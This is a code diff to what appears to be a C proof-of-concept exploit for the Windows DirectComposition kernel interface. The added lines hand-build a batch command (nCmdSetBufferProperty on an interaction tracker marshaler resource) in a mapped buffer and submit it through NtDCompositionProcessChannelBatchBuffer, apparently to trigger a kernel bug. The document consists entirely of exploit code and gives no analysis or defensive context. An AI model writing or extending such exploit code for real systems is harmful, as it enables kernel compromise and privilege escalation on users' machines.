@@ -137,5 +137,18 @@ int main(int argc, TCHAR* argv[])
     CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasize);
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);
 
+    szBuff[0] = CInteractionMarshaler1;
+    szBuff[1] = CInteractionMarshaler1;
+    szBuff[2] = CInteractionMarshaler1;
+    szBuff[3] = CInteractionMarshaler1;
+
+    datasize = 0x8; // Size == 0x10
+    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionTrackerMarshaler1;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0x15;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = datasize;
+    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasize);
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);
+
 
 }
